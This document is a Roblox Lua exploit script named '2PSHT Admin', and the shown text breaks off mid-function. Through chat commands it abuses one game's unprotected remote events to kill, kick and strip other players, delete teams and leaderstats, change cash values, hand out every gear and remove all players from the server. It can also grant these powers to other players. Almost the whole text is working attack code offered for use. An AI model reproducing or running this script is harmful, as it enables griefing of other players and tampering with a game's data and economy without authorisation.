--prefix
Prefix = ":"

if #Prefix > 4 or #Prefix < 0 then
  Prefix = ":"
end

--tables
administrators = {}
moderators = {}
banned = {}
loopkilled = {}
toolbanned = {}

--variables
example = "adminScript"
playersService = game:GetService("Players")
replicatedStorage = game:GetService("ReplicatedStorage")
starterGui = game:GetService("StarterGui")
coreGui = game:GetService("CoreGui")
runService = game:GetService("RunService")
localPlayer = playersService.LocalPlayer
createCommand = localPlayer.Chatted
Notification1 = Instance.new("Sound", coreGui)
Notification2 = Instance.new("Sound", coreGui)
Notification3 = Instance.new("Sound", coreGui)
CommandThemeSong = Instance.new("Sound", coreGui)
Notification1.Name = "2PSHTUAN1"
Notification2.Name = "2PSHTUAN2"
Notification3.Name = "2PSHTUAN3"
CommandThemeSong.Name = "2PSHTUANCTS"
Notification1.SoundId = "rbxassetid://523194796"
Notification2.SoundId = "rbxassetid://232127604"
Notification3.SoundId = "rbxassetid://1000294392"
Notification3.Volume = Notification3.Volume / 2
CommandThemeSong.SoundId = "rbxassetid://1836975833"
CommandThemeSong.Volume = CommandThemeSong.Volume / 3
adminScript = {}
adminScript.SoundFX = {
  _notification1=0;
  _notification2=1;
  _notification3=2;
  _commandthemesong=3;
}

adminScript.Settings = {
  _prefix=0;
  _example=1;
}

adminScript.Data = {_localPlayer=0}
adminScript.Settings._example = example
adminScript.Data._localPlayer = localPlayer
adminScript.SoundFX._notification1 = Notification1
adminScript.SoundFX._notification2 = Notification2
adminScript.SoundFX._notification3 = Notification3
adminScript.SoundFX._commandthemesong = CommandThemeSong

function GetPlayer(String)
  local Found = {}
  local strl = String:lower()
  if strl == "all" then
	for i,v in pairs(playersService:GetPlayers()) do
	  table.insert(Found,v.Name)
	end
  elseif strl == "others" then
	for i,v in pairs(playersService:GetPlayers()) do
	  if v.Name ~= adminScript.Data._localPlayer.Name then
		table.insert(Found,v.Name)
	  end
	end
  elseif strl == "me" then
	for i,v in pairs(playersService:GetPlayers()) do
	  if v.Name == adminScript.Data._localPlayer.Name then
		table.insert(Found,v.Name)
	  end
	end
  else
	for i,v in pairs(playersService:GetPlayers()) do
	  if v.Name:lower():sub(1, #String) == String:lower() then
		table.insert(Found,v.Name)
	  end
	end
  end
  return Found
end

createCommand:Connect(function(msg)
if msg:lower():sub(1,5+Prefix:len()) == Prefix.."kill " then
  for i,v in pairs(GetPlayer(string.sub(msg,6+Prefix:len()))) do
	if playersService[v].Character.Torso:FindFirstChild("Neck") then
	  replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Torso.Neck)
	end
	runService.RenderStepped:Wait()
  end
end
end)

createCommand:Connect(function(msg)
if msg:lower():sub(1,5+Prefix:len()) == Prefix.."kick " then
  for i,v in pairs(GetPlayer(string.sub(msg,6+Prefix:len()))) do
	if playersService:FindFirstChild(v) then
	  replicatedStorage.events.destroyObject:FireServer(playersService[v])
	end
  end
end
end)

createCommand:Connect(function(msg)
if msg:lower():sub(1,4+Prefix:len()) == Prefix.."ban " then
  for i,v in pairs(GetPlayer(string.sub(msg,5+Prefix:len()))) do
	table.insert(banned,playersService[v].Name)
  end
end
end)

createCommand:Connect(function(msg)
if msg:lower():sub(1,6+Prefix:len()) == Prefix.."unban " then
  a = string.sub(msg,Prefix:len()+7)
  for j,k in pairs(banned) do
	if string.match(k,a) then
	  table.remove(banned,j)
	end
  end
end
end)

createCommand:Connect(function(msg)
if msg:lower():sub(1,8+Prefix:len()) == Prefix.."toolban " then
  for i,v in pairs(GetPlayer(string.sub(msg,9+Prefix:len()))) do
	table.insert(toolbanned,playersService[v].Name)
  end
end
end)

createCommand:Connect(function(msg)
if msg:lower():sub(1,10+Prefix:len()) == Prefix.."untoolban " then
  for i,v in pairs(GetPlayer(string.sub(msg,11+Prefix:len()))) do
	for j,k in pairs(toolbanned) do
	  if string.match(k,v) then
		table.remove(toolbanned,j)
	  end
	end
  end
end
end)

createCommand:Connect(function(msg)
if msg:lower():sub(1,9+Prefix:len()) == Prefix.."loopkill " then
  for i,v in pairs(GetPlayer(string.sub(msg,10+Prefix:len()))) do
	table.insert(loopkilled,playersService[v].Name)
  end
end
end)

createCommand:Connect(function(msg)
if msg:lower():sub(1,11+Prefix:len()) == Prefix.."unloopkill " then
  for i,v in pairs(GetPlayer(string.sub(msg,12+Prefix:len()))) do
	for j,k in pairs(loopkilled) do
	  if string.match(k,v) then
		table.remove(loopkilled,j)
	  end
	end
  end
end
end)

createCommand:Connect(function(msg)
if msg:lower():sub(1,5+Prefix:len()) == Prefix.."cash " then
  for i,v in pairs(GetPlayer(string.split(msg, " ")[2])) do
	b = string.split(msg, " ")[3]
	game:GetService("ReplicatedStorage").Events.changeValue:InvokeServer(game:GetService('ReplicatedStorage').plrData[v].cash, b)
  end
end
end)

createCommand:Connect(function(msg)
if msg:lower():sub(1,10+Prefix:len()) == Prefix.."unpackage " then
  for i,v in pairs(GetPlayer(string.sub(msg,11+Prefix:len()))) do
	for x,o in pairs(playersService[v].Character:GetChildren()) do
	  if o:IsA("CharacterMesh") then
		replicatedStorage.events.destroyObject:FireServer(o)
	  end
	end
  end
end
end)

createCommand:Connect(function(msg)
if msg:lower():sub(1,7+Prefix:len()) == Prefix.."rlimbs " then
  for i,v in pairs(GetPlayer(string.sub(msg,8+Prefix:len()))) do
	if playersService[v].Character:FindFirstChild("Left Arm") then
	  replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Arm"])
	end
	if playersService[v].Character:FindFirstChild("Right Arm") then
	  replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Arm"])
	end
	if playersService[v].Character:FindFirstChild("Left Leg") then
	  replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Leg"])
	end
	if playersService[v].Character:FindFirstChild("Right Leg") then
	  replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Leg"])
	end
  end
end
end)

createCommand:Connect(function(msg)
if msg:lower():sub(1,12+Prefix:len()) == Prefix.."removelimbs " then
  for i,v in pairs(GetPlayer(string.sub(msg,13+Prefix:len()))) do
	if playersService[v].Character:FindFirstChild("Left Arm") then
	  replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Arm"])
	end
	if playersService[v].Character:FindFirstChild("Right Arm") then
	  replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Arm"])
	end
	if playersService[v].Character:FindFirstChild("Left Leg") then
	  replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Leg"])
	end
	if playersService[v].Character:FindFirstChild("Right Leg") then
	  replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Leg"])
	end
  end
end
end)

createCommand:Connect(function(msg)
if msg:lower():sub(1,6+Prefix:len()) == Prefix.."rarms " then
  for i,v in pairs(GetPlayer(string.sub(msg,7+Prefix:len()))) do
	if playersService[v].Character:FindFirstChild("Left Arm") then
	  replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Arm"])
	end
	if playersService[v].Character:FindFirstChild("Left Arm") then
	  replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Arm"])
	end
  end
end
end)

createCommand:Connect(function(msg)
if msg:lower():sub(1,11+Prefix:len()) == Prefix.."removearms " then
  for i,v in pairs(GetPlayer(string.sub(msg,12+Prefix:len()))) do
	if playersService[v].Character:FindFirstChild("Left Arm") then
	  replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Arm"])
	end
	if playersService[v].Character:FindFirstChild("Left Arm") then
	  replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Arm"])
	end
  end
end
end)

createCommand:Connect(function(msg)
if msg:lower():sub(1,6+Prefix:len()) == Prefix.."rlegs " then
  for i,v in pairs(GetPlayer(string.sub(msg,7+Prefix:len()))) do
	if playersService[v].Character:FindFirstChild("Left Leg") then
	  replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Leg"])
	end
	if playersService[v].Character:FindFirstChild("Right Leg") then
	  replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Leg"])
	end
  end
end
end)

createCommand:Connect(function(msg)
if msg:lower():sub(1,11+Prefix:len()) == Prefix.."removelegs " then
  for i,v in pairs(GetPlayer(string.sub(msg,12+Prefix:len()))) do
	if playersService[v].Character:FindFirstChild("Left Leg") then
	  replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Leg"])
	end
	if playersService[v].Character:FindFirstChild("Right Leg") then
	  replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Leg"])
	end
  end
end
end)

createCommand:Connect(function(msg)
if msg:lower():sub(1,7+Prefix:len()) == Prefix.."punish " then
  for i,v in pairs(GetPlayer(string.sub(msg,8+Prefix:len()))) do
	replicatedStorage.events.destroyObject:FireServer(playersService[v].Character)
  end
end
end)

createCommand:Connect(function(msg)
if msg:lower():sub(1,6+Prefix:len()) == Prefix.."naked " then
  for i,v in pairs(GetPlayer(string.sub(msg,7+Prefix:len()))) do
	if playersService[v].Character:FindFirstChild("Shirt") then
	  replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Shirt)
	else
	end
	if playersService[v].Character:FindFirstChild("Pants") then
	  replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Pants)
	else
	end
	if playersService[v].Character:FindFirstChild("Shirt Graphic") then
	  replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Shirt Graphic"])
	else
	end
  end
end
end)

createCommand:Connect(function(msg)
if msg:lower():sub(1,7+Prefix:len()) == Prefix.."nayked " then
  for i,v in pairs(GetPlayer(string.sub(msg,8+Prefix:len()))) do
	if playersService[v].Character:FindFirstChild("Shirt") then
	  replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Shirt)
	else
	end
	if playersService[v].Character:FindFirstChild("Pants") then
	  replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Pants)
	else
	end
	if playersService[v].Character:FindFirstChild("Shirt Graphic") then
	  replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Shirt Graphic"])
	else
	end
  end
end
end)

createCommand:Connect(function(msg)
if msg:lower():sub(1,9+Prefix:len()) == Prefix.."faceless " then
  for i,v in pairs(GetPlayer(string.sub(msg,10+Prefix:len()))) do
	replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Head:FindFirstChildOfClass("Decal"))
  end
end
end)

createCommand:Connect(function(msg)
if msg:lower():sub(1,6+Prefix:len()) == Prefix.."rface " then
  for i,v in pairs(GetPlayer(string.sub(msg,7+Prefix:len()))) do
	if adminScript.Data._localPlayer.Character.Head:FindFirstChild("face") then
	  replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Head:FindFirstChildOfClass("Decal"))
	end
  end
end
end)

createCommand:Connect(function(msg)
if msg:lower():sub(1,11+Prefix:len()) == Prefix.."removeface " then
  for i,v in pairs(GetPlayer(string.sub(msg,12+Prefix:len()))) do
	if adminScript.Data._localPlayer.Character.Head:FindFirstChild("face") then
	  replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Head:FindFirstChildOfClass("Decal"))
	end
  end
end
end)

createCommand:Connect(function(msg)
if msg:lower():sub(1,6+Prefix:len()) == Prefix.."rhats " then
  for i,v in pairs(GetPlayer(string.sub(msg,7+Prefix:len()))) do
	for x,o in pairs(playersService[v].Character:GetChildren()) do
	  if o:IsA("Accessory") then
		replicatedStorage.events.destroyObject:FireServer(o)
	  end
	end
  end
end
end)

createCommand:Connect(function(msg)
if msg:lower():sub(1,11+Prefix:len()) == Prefix.."removehats " then
  for i,v in pairs(GetPlayer(string.sub(msg,12+Prefix:len()))) do
	for x,o in pairs(playersService[v].Character:GetChildren()) do
	  if o:IsA("Accessory") then
		replicatedStorage.events.destroyObject:FireServer(o)
	  end
	end
  end
end
end)

createCommand:Connect(function(msg)
if msg:lower():sub(1,8+Prefix:len()) == Prefix.."creeper " then
  for i,v in pairs(GetPlayer(string.sub(msg,9+Prefix:len()))) do
	if playersService[v].Character.Head:FindFirstChild("Mesh") then
	  replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Head.Mesh)
	end
	if playersService[v].Character:FindFirstChild("Left Arm") then
	  replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Arm"])
	end
	if playersService[v].Character:FindFirstChild("Right Arm") then
	  replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Arm"])
	end
  end
end
end)

createCommand:Connect(function(msg)
if msg:lower():sub(1,8+Prefix:len()) == Prefix.."ragdoll " then
  for i,v in pairs(GetPlayer(string.sub(msg,9+Prefix:len()))) do
	if playersService[v].Character:FindFirstChild("Humanoid") then
	  replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Humanoid)
	end
  end
end
end)

createCommand:Connect(function(msg)
if msg:lower() == Prefix.."clearteams" then
  for i,v in pairs(game.Teams:GetChildren()) do
	replicatedStorage.events.destroyObject:FireServer(v)
  end
end
end)

createCommand:Connect(function(msg)
if msg:lower() == Prefix.."cteams" then
  for i,v in pairs(game.Teams:GetChildren()) do
	replicatedStorage.events.destroyObject:FireServer(v)
  end
end
end)


createCommand:Connect(function(msg)
if msg:lower() == Prefix.."ccash" then
  for i,v in pairs(playersService:GetPlayers()) do
	if v:FindFirstChild("leaderstats") then
	  replicatedStorage.events.destroyObject:FireServer(v.leaderstats)
	end
  end
end
end)

createCommand:Connect(function(msg)
if msg:lower() == Prefix.."clearcash" then
  for i,v in pairs(playersService:GetPlayers()) do
	if v:FindFirstChild("leaderstats") then
	  replicatedStorage.events.destroyObject:FireServer(v.leaderstats)
	end
  end
end
end)

createCommand:Connect(function(msg)
if msg:lower() == Prefix.."clear" then
  for i,v in pairs(workspace:GetChildren()) do
	if v:IsA("Accessory") or v:IsA("Hat") or v:IsA("Tool") then
	  replicatedStorage.events.destroyObject:FireServer(v)
	end
  end
  for i,v in pairs(workspace.Terrain:GetChildren()) do
	if v:IsA("Accessory") or v:IsA("Hat") or v:IsA("Tool") then
	  replicatedStorage.events.destroyObject:FireServer(v)
	end
  end
end
end)

--cmds
createCommand:Connect(function(msg)
if msg:lower():sub(1,5+Prefix:len()) == Prefix.."goto " then
  for i,v in pairs(GetPlayer(string.sub(msg,6+Prefix:len()))) do
	adminScript.Data._localPlayer.Character.HumanoidRootPart.CFrame = playersService[v].Character.HumanoidRootPart.CFrame
  end
end
end)

createCommand:Connect(function(msg)
if msg:lower():sub(1,3+Prefix:len()) == Prefix.."to " then
  for i,v in pairs(GetPlayer(string.sub(msg,4+Prefix:len()))) do
	adminScript.Data._localPlayer.Character.HumanoidRootPart.CFrame = playersService[v].Character.HumanoidRootPart.CFrame
  end
end
end)

createCommand:Connect(function(msg)
if msg:lower():sub(1,7+Prefix:len()) == Prefix.."handto " then
  for i,v in pairs(GetPlayer(string.sub(msg,8+Prefix:len()))) do
	adminScript.Data._localPlayer.Character.HumanoidRootPart.CFrame = playersService[v].Character.HumanoidRootPart.CFrame
  end
end
end)

createCommand:Connect(function(msg)
if msg:lower():sub(1,6+Prefix:len()) == Prefix.."tp me " then
  for i,v in pairs(GetPlayer(string.sub(msg,7+Prefix:len()))) do
	adminScript.Data._localPlayer.Character.HumanoidRootPart.CFrame = playersService[v].Character.HumanoidRootPart.CFrame
  end
end
end)

createCommand:Connect(function(msg)
if msg:lower():sub(1,12+Prefix:len()) == Prefix.."teleport me " then
  for i,v in pairs(GetPlayer(string.sub(msg,13+Prefix:len()))) do
	adminScript.Data._localPlayer.Character.HumanoidRootPart.CFrame = playersService[v].Character.HumanoidRootPart.CFrame
  end
end
end)

createCommand:Connect(function(msg)
if msg:lower():sub(1,6+Prefix:len()) == Prefix.."shout " then
  local Shout = msg:sub(7+Prefix:len(), #msg)
  replicatedStorage.Events.changeValue:InvokeServer(adminScript.Data._localPlayer.Shouts, 1e10)
  replicatedStorage.Events.Shout:InvokeServer(Shout)
end
end)

createCommand:Connect(function(msg)
if msg:lower():sub(1,3+Prefix:len()) == Prefix.."cm " then
  local ChatMessage = msg:sub(4+Prefix:len(), #msg)
  replicatedStorage.Events.changeValue:InvokeServer(adminScript.Data._localPlayer.Shouts, 1e10)
  replicatedStorage.Events.Shout:InvokeServer(string.rep("\n",53)..ChatMessage)
end
end)

createCommand:Connect(function(msg)
if msg:lower():sub(1,9+Prefix:len()) == Prefix.."cmessage " then
  local ChatMessage = msg:sub(10+Prefix:len(), #msg)
  replicatedStorage.Events.changeValue:InvokeServer(adminScript.Data._localPlayer.Shouts, 1e10)
  replicatedStorage.Events.Shout:InvokeServer(string.rep("\n",53)..ChatMessage)
end
end)

createCommand:Connect(function(msg)
if msg:lower():sub(1,12+Prefix:len()) == Prefix.."chatmessage " then
  local ChatMessage = msg:sub(13+Prefix:len(), #msg)
  replicatedStorage.Events.changeValue:InvokeServer(adminScript.Data._localPlayer.Shouts, 1e10)
  replicatedStorage.Events.Shout:InvokeServer(string.rep("\n",53)..ChatMessage)
end
end)

createCommand:Connect(function(msg)
if msg:lower() == Prefix.."shutdown" then
  for _,__ in pairs(playersService:GetPlayers()) do
	replicatedStorage.events.destroyObject:FireServer(__)
  end
end
end)

createCommand:Connect(function(msg)
if msg:lower() == Prefix.."givegears" then
  for i,v in pairs(replicatedStorage["BoxItems"]:GetChildren()) do
	if v:IsA("Tool") then
	  replicatedStorage.Events.CrateClaim:FireServer("Gear",v)
	end
  end
  for i,v in pairs(game.Lighting:GetDescendants()) do
	if v:IsA("Tool") then
	  replicatedStorage.Events.CrateClaim:FireServer("Gear",v)
	end
  end
end
end)

createCommand:Connect(function(msg)
if msg:lower():sub(1,7+Prefix:len()) == Prefix.."prefix " then
  local PrefixChange = msg:sub(8+Prefix:len(), #msg)
  if #PrefixChange > 4 then
	starterGui:SetCore("SendNotification", {
	  Title = "2PSHT Admin | Error";
	  Text = "Prefix has to be be at most 4 characters. Now setting prefix to \":\"";
	  Duration = 15;
	  Button1 = "Close";
	})
	adminScript.SoundFX._notification3:Play()
	Prefix = ":"
  elseif #PrefixChange < 0 then
	starterGui:SetCore("SendNotification", {
	  Title = "2PSHT Admin | Error";
	  Text = "Prefix has to be be at least 0 characters. Now setting prefix to \":\"";
	  Duration = 15;
	  Button1 = "Close";
	})
	adminScript.SoundFX._notification3:Play()
	Prefix = ":"
  else
	adminScript.SoundFX._notification1:Play()
	Prefix = PrefixChange
	starterGui:SetCore("SendNotification", {
	  Title = "2PSHT Admin | Success";
	  Text = "The 2PSHT Admin prefix has been set to \""..Prefix.."\".";
	  Duration = 15;
	  Button1 = "Close";
	})
  end
end
end)

createCommand:Connect(function(msg)
if msg:lower() == Prefix.."cmds" or msg:lower() == Prefix.."commands" then
  adminScript.SoundFX._notification2:Play()
  Site = "https://pastebin.com/raw/FeWZpcV9"
  site = string.gsub(string.gsub(Site,"/","\\"),":\\\\","://").."?www.roblox.com"
  game.GuiService:OpenBrowserWindow(site)
  wait(2)
  adminScript.SoundFX._commandthemesong:Play()
  game.GuiService.BrowserWindowClosed:Wait()
  adminScript.SoundFX._commandthemesong:Stop()
end
end)

createCommand:Connect(function(msg)
if msg:lower():sub(1,4+Prefix:len()) == Prefix.."mod " then
  for i,v in pairs(GetPlayer(string.sub(msg,5+Prefix:len()))) do
	if playersService:FindFirstChild(v) then
	  table.insert(moderators,playersService[v].Name)
	  adminScript.SoundFX._notification1:Play()
	  starterGui:SetCore("SendNotification", {
		Title = "2PSHT Admin | Success";
		Text = "Moderator powers given to \""..v.."\".";
		Duration = 15;
		Button1 = "Close";
	  })
	  Command1 = playersService[v].Chatted:Connect(function(msg)
	  if msg:lower():sub(1,5+Prefix:len()) == Prefix.."kill " then
		for i,v in pairs(GetPlayer(string.sub(msg,6+Prefix:len()))) do
		  if playersService[v].Character.Torso:FindFirstChild("Neck") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Torso.Neck)
		  end
		  runService.RenderStepped:Wait()
		end
	  end
	  end)

	  Command2 = playersService[v].Chatted:Connect(function(msg)
	  if msg:lower():sub(1,5+Prefix:len()) == Prefix.."cash " then
		for i,v in pairs(GetPlayer(string.split(msg, " ")[2])) do
		  b = string.split(msg, " ")[3]
		  game:GetService("ReplicatedStorage").Events.changeValue:InvokeServer(game:GetService('ReplicatedStorage').plrData[v].cash, b)
		end
	  end
	  end)

	  Command3 = playersService[v].Chatted:Connect(function(msg)
	  if msg:lower():sub(1,10+Prefix:len()) == Prefix.."unpackage " then
		for i,v in pairs(GetPlayer(string.sub(msg,11+Prefix:len()))) do
		  for x,o in pairs(playersService[v].Character:GetChildren()) do
			if o:IsA("CharacterMesh") then
			  replicatedStorage.events.destroyObject:FireServer(o)
			end
		  end
		end
	  end
	  end)

	  Command4 = playersService[v].Chatted:Connect(function(msg)
	  if msg:lower():sub(1,7+Prefix:len()) == Prefix.."rlimbs " then
		for i,v in pairs(GetPlayer(string.sub(msg,8+Prefix:len()))) do
		  if playersService[v].Character:FindFirstChild("Left Arm") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Arm"])
		  end
		  if playersService[v].Character:FindFirstChild("Right Arm") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Arm"])
		  end
		  if playersService[v].Character:FindFirstChild("Left Leg") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Leg"])
		  end
		  if playersService[v].Character:FindFirstChild("Right Leg") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Leg"])
		  end
		end
	  end
	  end)

	  Command5 = playersService[v].Chatted:Connect(function(msg)
	  if msg:lower():sub(1,12+Prefix:len()) == Prefix.."removelimbs " then
		for i,v in pairs(GetPlayer(string.sub(msg,13+Prefix:len()))) do
		  if playersService[v].Character:FindFirstChild("Left Arm") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Arm"])
		  end
		  if playersService[v].Character:FindFirstChild("Right Arm") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Arm"])
		  end
		  if playersService[v].Character:FindFirstChild("Left Leg") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Leg"])
		  end
		  if playersService[v].Character:FindFirstChild("Right Leg") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Leg"])
		  end
		end
	  end
	  end)

	  Command6 = playersService[v].Chatted:Connect(function(msg)
	  if msg:lower():sub(1,6+Prefix:len()) == Prefix.."rarms " then
		for i,v in pairs(GetPlayer(string.sub(msg,7+Prefix:len()))) do
		  if playersService[v].Character:FindFirstChild("Left Arm") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Arm"])
		  end
		  if playersService[v].Character:FindFirstChild("Left Arm") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Arm"])
		  end
		end
	  end
	  end)

	  Command7 = playersService[v].Chatted:Connect(function(msg)
	  if msg:lower():sub(1,11+Prefix:len()) == Prefix.."removearms " then
		for i,v in pairs(GetPlayer(string.sub(msg,12+Prefix:len()))) do
		  if playersService[v].Character:FindFirstChild("Left Arm") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Arm"])
		  end
		  if playersService[v].Character:FindFirstChild("Left Arm") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Arm"])
		  end
		end
	  end
	  end)

	  Command8 = playersService[v].Chatted:Connect(function(msg)
	  if msg:lower():sub(1,6+Prefix:len()) == Prefix.."rlegs " then
		for i,v in pairs(GetPlayer(string.sub(msg,7+Prefix:len()))) do
		  if playersService[v].Character:FindFirstChild("Left Leg") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Leg"])
		  end
		  if playersService[v].Character:FindFirstChild("Right Leg") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Leg"])
		  end
		end
	  end
	  end)

	  Command9 = playersService[v].Chatted:Connect(function(msg)
	  if msg:lower():sub(1,11+Prefix:len()) == Prefix.."removelegs " then
		for i,v in pairs(GetPlayer(string.sub(msg,12+Prefix:len()))) do
		  if playersService[v].Character:FindFirstChild("Left Leg") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Leg"])
		  end
		  if playersService[v].Character:FindFirstChild("Right Leg") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Leg"])
		  end
		end
	  end
	  end)

	  Command10 = playersService[v].Chatted:Connect(function(msg)
	  if msg:lower():sub(1,6+Prefix:len()) == Prefix.."naked " then
		for i,v in pairs(GetPlayer(string.sub(msg,7+Prefix:len()))) do
		  if playersService[v].Character:FindFirstChild("Shirt") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Shirt)
		  else
		  end
		  if playersService[v].Character:FindFirstChild("Pants") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Pants)
		  else
		  end
		  if playersService[v].Character:FindFirstChild("Shirt Graphic") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Shirt Graphic"])
		  else
		  end
		end
	  end
	  end)

	  Command11 = playersService[v].Chatted:Connect(function(msg)
	  if msg:lower():sub(1,7+Prefix:len()) == Prefix.."nayked " then
		for i,v in pairs(GetPlayer(string.sub(msg,8+Prefix:len()))) do
		  if playersService[v].Character:FindFirstChild("Shirt") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Shirt)
		  else
		  end
		  if playersService[v].Character:FindFirstChild("Pants") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Pants)
		  else
		  end
		  if playersService[v].Character:FindFirstChild("Shirt Graphic") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Shirt Graphic"])
		  else
		  end
		end
	  end
	  end)

	  Command12 = playersService[v].Chatted:Connect(function(msg)
      if msg:lower():sub(1,9+Prefix:len()) == Prefix.."faceless " then
        for i,v in pairs(GetPlayer(string.sub(msg,10+Prefix:len()))) do
          replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Head:FindFirstChildOfClass("Decal"))
        end
      end
	  end)

	  Command13 = playersService[v].Chatted:Connect(function(msg)
	  if msg:lower():sub(1,6+Prefix:len()) == Prefix.."rface " then
		for i,v in pairs(GetPlayer(string.sub(msg,7+Prefix:len()))) do
		  if adminScript.Data._localPlayer.Character.Head:FindFirstChild("face") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Head:FindFirstChildOfClass("Decal"))
		  end
		end
	  end
	  end)

	  Command14 = playersService[v].Chatted:Connect(function(msg)
	  if msg:lower():sub(1,11+Prefix:len()) == Prefix.."removeface " then
		for i,v in pairs(GetPlayer(string.sub(msg,12+Prefix:len()))) do
		  if adminScript.Data._localPlayer.Character.Head:FindFirstChild("face") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Head:FindFirstChildOfClass("Decal"))
		  end
		end
	  end
	  end)

	  Command15 = playersService[v].Chatted:Connect(function(msg)
	  if msg:lower():sub(1,6+Prefix:len()) == Prefix.."rhats " then
		for i,v in pairs(GetPlayer(string.sub(msg,7+Prefix:len()))) do
		  for x,o in pairs(playersService[v].Character:GetChildren()) do
			if o:IsA("Accessory") then
			  replicatedStorage.events.destroyObject:FireServer(o)
			end
		  end
		end
	  end
	  end)

	  Command16 = playersService[v].Chatted:Connect(function(msg)
	  if msg:lower():sub(1,11+Prefix:len()) == Prefix.."removehats " then
		for i,v in pairs(GetPlayer(string.sub(msg,12+Prefix:len()))) do
		  for x,o in pairs(playersService[v].Character:GetChildren()) do
			if o:IsA("Accessory") then
			  replicatedStorage.events.destroyObject:FireServer(o)
			end
		  end
		end
	  end
	  end)

	  Command17 = playersService[v].Chatted:Connect(function(msg)
	  if msg:lower():sub(1,8+Prefix:len()) == Prefix.."creeper " then
		for i,v in pairs(GetPlayer(string.sub(msg,9+Prefix:len()))) do
		  if playersService[v].Character.Head:FindFirstChild("Mesh") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Head.Mesh)
		  end
		  if playersService[v].Character:FindFirstChild("Left Arm") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Arm"])
		  end
		  if playersService[v].Character:FindFirstChild("Right Arm") then
			replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Arm"])
		  end
		end
	  end
	  end)

	  Command18 = playersService[v].Chatted:Connect(function(msg)
	  if msg:lower():sub(1,8+Prefix:len()) == Prefix.."toolban " then
		for i,v in pairs(GetPlayer(string.sub(msg,9+Prefix:len()))) do
		  table.insert(toolbanned,playersService[v].Name)
		end
	  end
	  end)

	  Command19 = playersService[v].Chatted:Connect(function(msg)
	  if msg:lower():sub(1,10+Prefix:len()) == Prefix.."untoolban " then
		for i,v in pairs(GetPlayer(string.sub(msg,11+Prefix:len()))) do
		  for j,k in pairs(toolbanned) do
			if string.match(k,v) then
			  table.remove(toolbanned,j)
			end
		  end
		end
	  end
	  end)

	end
  end
end
end)

createCommand:Connect(function(msg)
if msg:lower():sub(1,6+Prefix:len()) == Prefix.."unmod " then
  for i,v in pairs(GetPlayer(string.sub(msg,7+Prefix:len()))) do
	for j,k in pairs(moderators) do
	  if string.match(k,v) then
		table.remove(moderators,j)
		for _=1,19 do
		  Command1:Disconnect()
		  Command2:Disconnect()
		  Command3:Disconnect()
		  Command4:Disconnect()
		  Command5:Disconnect()
		  Command6:Disconnect()
		  Command7:Disconnect()
		  Command8:Disconnect()
		  Command9:Disconnect()
		  Command10:Disconnect()
		  Command11:Disconnect()
		  Command12:Disconnect()
		  Command13:Disconnect()
		  Command14:Disconnect()
		  Command15:Disconnect()
		  Command16:Disconnect()
		  Command17:Disconnect()
		  Command18:Disconnect()
		  Command19:Disconnect()
		end
	  end
	end
  end
end
end)

createCommand:Connect(function(msg)
if msg:lower():sub(1,10+Prefix:len()) == Prefix.."moderator " then
  for i,v in pairs(GetPlayer(string.sub(msg,11+Prefix:len()))) do
	if playersService:FindFirstChild(v) then
